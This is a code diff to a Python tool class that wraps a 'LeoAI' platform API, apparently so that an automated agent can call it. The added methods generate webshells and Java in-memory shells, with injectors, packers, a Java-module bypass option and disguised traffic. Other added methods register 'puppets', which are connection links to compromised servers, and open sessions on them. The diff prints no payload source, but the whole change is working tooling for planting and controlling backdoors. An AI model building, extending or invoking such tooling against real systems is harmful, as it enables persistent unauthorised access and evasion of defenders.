@@ -3,6 +3,7 @@ from __future__ import annotations
 import asyncio
 import base64
 import binascii
+import json
 from typing import Any
 
 from .client import LeoAIClient
@@ -219,6 +220,219 @@ class LeoAITools:
                 "truncated": bool(data.get("truncated")),
             },
         }
+
+    async def list_disguises(self) -> dict[str, object]:
+        data = await self._request("GET", "/platform/disguise-manager/disguises")
+        if not isinstance(data, list):
+            raise LeoAIError("leoai_protocol_error", "LeoAI returned an invalid disguise list")
+        return {
+            "untrusted_external_content": True,
+            "disguises": [_disguise_summary(item) for item in data],
+        }
+
+    async def list_shell_generator_types(self) -> dict[str, object]:
+        data = await self._request("GET", "/platform/shell-generator/supported-types")
+        if not isinstance(data, dict):
+            raise LeoAIError("leoai_protocol_error", "LeoAI returned invalid generator types")
+        catalog: dict[str, object] = {}
+        for field in (
+            "transportProtocols",
+            "runtimeGenerators",
+            "targetJavaVersions",
+            "servletNamespaces",
+            "serverInjectorTypes",
+            "serverProtocolInjectorTypes",
+        ):
+            if field in data:
+                catalog[field] = _sanitize_external(data[field])
+        injectors = data.get("serverInjectorTypes")
+        if isinstance(injectors, dict):
+            catalog["serverTypes"] = sorted(str(name) for name in injectors)
+        packer_names = _packer_names(data.get("packerTypes"))
+        if packer_names:
+            catalog["packerTypes"] = packer_names
+        return {"untrusted_external_content": True, "generator": catalog}
+
+    async def create_project(
+        self,
+        project_name: str,
+        *,
+        project_code: str | None = None,
+        description: str | None = None,
+        permission: str = "private",
+    ) -> dict[str, object]:
+        payload: dict[str, object] = {
+            "projectName": project_name,
+            "permission": permission,
+        }
+        if project_code is not None:
+            payload["projectCode"] = project_code
+        if description is not None:
+            payload["description"] = description
+        data = await self._action_request("POST", "/platform/projects", json=payload)
+        if not isinstance(data, dict) or not isinstance(data.get("projectId"), str):
+            raise LeoAIError("leoai_protocol_error", "LeoAI returned an invalid created project")
+        return {
+            "untrusted_external_content": True,
+            "project": _pick(
+                data,
+                "projectId",
+                "projectName",
+                "projectCode",
+                "description",
+                "status",
+                "permission",
+            ),
+        }
+
+    async def generate_runtime_artifact(
+        self,
+        runtime: str,
+        artifact_type: str,
+        req_disguise_id: str,
+        resp_disguise_id: str,
+    ) -> dict[str, object]:
+        data = await self._action_request(
+            "POST",
+            "/platform/shell-generator/generate/runtime",
+            json={
+                "runtime": runtime,
+                "artifactType": artifact_type,
+                "reqDisguiseId": req_disguise_id,
+                "respDisguiseId": resp_disguise_id,
+            },
+        )
+        return _generated_artifact("runtime", data)
+
+    async def generate_webshell(
+        self,
+        shell_type: str,
+        req_disguise_id: str,
+        resp_disguise_id: str,
+        *,
+        protocol: str | None = None,
+    ) -> dict[str, object]:
+        payload: dict[str, object] = {
+            "shellType": shell_type,
+            "reqDisguiseId": req_disguise_id,
+            "respDisguiseId": resp_disguise_id,
+        }
+        if protocol is not None:
+            payload["protocol"] = protocol
+        data = await self._action_request(
+            "POST",
+            "/platform/shell-generator/generate/webshell",
+            json=payload,
+        )
+        return _generated_artifact("webshell", data)
+
+    async def generate_memory_shell(
+        self,
+        server_type: str,
+        shell_type: str,
+        packer_type: str,
+        req_disguise_id: str,
+        resp_disguise_id: str,
+        *,
+        protocol: str | None = None,
+        server_version: str | None = None,
+        url_pattern: str | None = None,
+        header_name: str | None = None,
+        header_value: str | None = None,
+        target_java_version: str | None = None,
+        servlet_namespace: str | None = None,
+        bypass_java_module: bool | None = None,
+    ) -> dict[str, object]:
+        protocol_value = protocol or "http"
+        if protocol_value in {"http", "httpchunk"} and (not header_name or not header_value):
+            raise LeoAIError(
+                "tool_input_invalid",
+                "http/httpchunk memory shells require headerName and headerValue",
+            )
+        payload: dict[str, object] = {
+            "serverType": server_type,
+            "shellType": shell_type,
+            "packerType": packer_type,
+            "reqDisguiseId": req_disguise_id,
+            "respDisguiseId": resp_disguise_id,
+        }
+        if protocol is not None:
+            payload["protocol"] = protocol
+        if server_version is not None:
+            payload["serverVersion"] = server_version
+        if url_pattern is not None:
+            payload["urlPattern"] = url_pattern
+        if header_name is not None:
+            payload["headerName"] = header_name
+        if header_value is not None:
+            payload["headerValue"] = header_value
+        if target_java_version is not None:
+            payload["targetJavaVersion"] = target_java_version
+        if servlet_namespace is not None:
+            payload["servletNamespace"] = servlet_namespace
+        if bypass_java_module is not None:
+            payload["byPassJavaModule"] = bypass_java_module
+        data = await self._action_request(
+            "POST",
+            "/platform/shell-generator/generate/memoryshell",
+            json=payload,
+        )
+        return _generated_artifact("memoryshell", data)
+
+    async def add_puppet(
+        self,
+        puppet_name: str,
+        conn_link: str,
+        req_disguise_id: str,
+        resp_disguise_id: str,
+        *,
+        protocol: str,
+        puppet_type: str,
+        project_id: str | None = None,
+        permission: str = "private",
+        remark: str | None = None,
+        parent_puppet_id: str = "root",
+        header_name: str | None = None,
+        header_value: str | None = None,
+    ) -> dict[str, object]:
+        if (header_name is None) != (header_value is None):
+            raise LeoAIError(
+                "tool_input_invalid",
+                "headerName and headerValue must be provided together",
+            )
+        payload: dict[str, object] = {
+            "puppetName": puppet_name,
+            "connLink": conn_link,
+            "protocol": protocol,
+            "type": puppet_type,
+            "reqDisguiseId": req_disguise_id,
+            "respDisguiseId": resp_disguise_id,
+            "permission": permission,
+            "parentPuppetId": parent_puppet_id,
+        }
+        if remark is not None:
+            payload["remark"] = remark
+        if header_name is not None and header_value is not None:
+            payload["headers"] = json.dumps({header_name: header_value}, separators=(",", ":"))
+        params = {"projectId": project_id} if project_id is not None else None
+        data = await self._action_request(
+            "POST",
+            "/platform/puppet-manage/puppets",
+            params=params,
+            json=payload,
+        )
+        if not isinstance(data, dict) or not isinstance(data.get("puppetId"), str):
+            raise LeoAIError("leoai_protocol_error", "LeoAI returned an invalid created Puppet")
+        result: dict[str, object] = {
+            "operation": "puppet_added",
+            "puppetId": data["puppetId"],
+            "puppetName": puppet_name,
+            "protocol": protocol,
+            "type": puppet_type,
+        }
+        if project_id is not None:
+            result["projectId"] = project_id
+        return result
 
     async def open_session(self, puppet_id: str, project_id: str | None = None) -> dict[str, object]:
         params = {"puppetId": puppet_id}
@@ -1130,6 +1344,87 @@ class LeoAITools:
                 self._active_requests -= 1
 
 
+
+def _disguise_summary(value: Any) -> dict[str, object]:
+    if not isinstance(value, dict):
+        raise LeoAIError("leoai_protocol_error", "LeoAI returned an invalid disguise")
+    return _pick(value, "disguiseId", "disguiseName", "version", "description", "remark")
+
+
+def _generated_artifact(kind: str, value: Any) -> dict[str, object]:
+    if not isinstance(value, dict):
+        raise LeoAIError("leoai_protocol_error", "LeoAI returned an invalid generated artifact")
+    content = _artifact_content(value)
+    if content is None:
+        raise LeoAIError("leoai_protocol_error", "LeoAI returned an empty generated artifact")
+    artifact: dict[str, object] = {
+        "kind": kind,
+        "content": content,
+    }
+    artifact.update(_pick(value, "fileExtension", "mediaType", "warnings"))
+    metadata = value.get("metadata")
+    if not isinstance(metadata, dict):
+        metadata = {
+            key: item
+            for key, item in value.items()
+            if key not in _ARTIFACT_RESERVED_KEYS
+        }
+    if metadata:
+        artifact["metadata"] = _sanitize_external(metadata)
+    class_artifacts = value.get("classArtifacts")
+    if isinstance(class_artifacts, dict):
+        artifact["classArtifactNames"] = [str(name) for name in class_artifacts]
+    return {"untrusted_external_content": True, "artifact": artifact}
+
+
+_ARTIFACT_CONTENT_KEYS = ("content", "shell", "code")
+_ARTIFACT_RESERVED_KEYS = {
+    "classArtifacts",
+    "code",
+    "content",
+    "fileExtension",
+    "mediaType",
+    "metadata",
+    "shell",
+    "warnings",
+}
+
+
+def _artifact_content(value: dict[str, Any]) -> str | None:
+    for key in _ARTIFACT_CONTENT_KEYS:
+        content = value.get(key)
+        if isinstance(content, str) and content:
+            return content
+    return None
+
+
+def _packer_names(value: Any) -> list[str]:
+    names: list[str] = []
+    seen: set[str] = set()
+
+    def add(name: object) -> None:
+        text = str(name)
+        if text and text not in seen:
+            seen.add(text)
+            names.append(text)
+
+    if isinstance(value, dict):
+        groups = value.get("groups")
+        if isinstance(groups, list):
+            for group in groups:
+                if isinstance(group, dict) and isinstance(group.get("packers"), list):
+                    for packer in group["packers"]:
+                        add(packer)
+        ungrouped = value.get("ungrouped")
+        if isinstance(ungrouped, list):
+            for packer in ungrouped:
+                add(packer)
+    elif isinstance(value, list):
+        for item in value:
+            add(item)
+    return names
+
+
 def _project_summary(value: Any) -> dict[str, object]:
     if not isinstance(value, dict) or not isinstance(value.get("project"), dict):
         raise LeoAIError("leoai_protocol_error", "LeoAI returned an invalid project")
@@ -1256,6 +1551,7 @@ def _is_sensitive_key(key: str) -> bool:
         or "password" in normalized
         or "secret" in normalized
         or "token" in normalized
+        or normalized.startswith("header")
         or normalized.startswith("proxy")
         or normalized.endswith("disguiseid")
         or normalized.endswith("strategy")
